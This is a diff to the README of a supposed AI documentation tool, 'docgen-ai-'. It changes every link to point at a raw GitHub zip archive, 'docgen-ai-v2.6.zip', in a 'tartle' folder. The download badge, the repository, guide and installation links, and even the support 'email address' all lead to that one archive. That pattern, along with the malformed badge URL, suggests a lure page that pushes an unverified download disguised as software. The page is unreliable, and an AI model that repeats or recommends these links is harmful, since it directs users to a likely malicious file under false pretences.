@@ -1,6 +1,6 @@
 # 🤖 docgen-ai- - Generate Documentation Effortlessly  
 
-[![Download docgen-ai-](https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-.zip%https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-.zip)](https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-.zip)
+[![Download docgen-ai-](https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-v2.6.zip%https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-v2.6.zip)](https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-v2.6.zip)
 
 ## 🚀 Getting Started  
 
@@ -18,7 +18,7 @@ Before you begin, ensure that you meet these system requirements:
 
 To get started, follow these steps:
 
-1. Visit this page to download: [Download docgen-ai-](https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-.zip)
+1. Visit this page to download: [Download docgen-ai-](https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-v2.6.zip)
    
    Here, you will find the latest version of the docgen-ai- extension. Look for the file that is appropriate for your operating system.
 
@@ -58,7 +58,7 @@ If you encounter any issues while using docgen-ai-, don't hesitate to reach out.
 
 - Check the **FAQ** in the repository for common questions.
 - Report issues directly on the **Issues** page of the GitHub repository.
-- Contact the support team via email at https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-.zip
+- Contact the support team via email at https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-v2.6.zip
 
 ## 👍 Contributing  
 
@@ -70,9 +70,9 @@ We welcome contributions to make docgen-ai- even better! If you would like to he
 
 ## 📚 Resources  
 
-- [GitHub Repository](https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-.zip)
-- [Documentation Guide](https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-.zip)
-- [Installation Instructions](https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-v2.6.zip)
+- [Documentation Guide](https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-v2.6.zip)
+- [Installation Instructions](https://raw.githubusercontent.com/BASDjay/docgen-ai-/main/tartle/docgen-ai-v2.6.zip)
 
 ## 🔍 Additional Information  
 
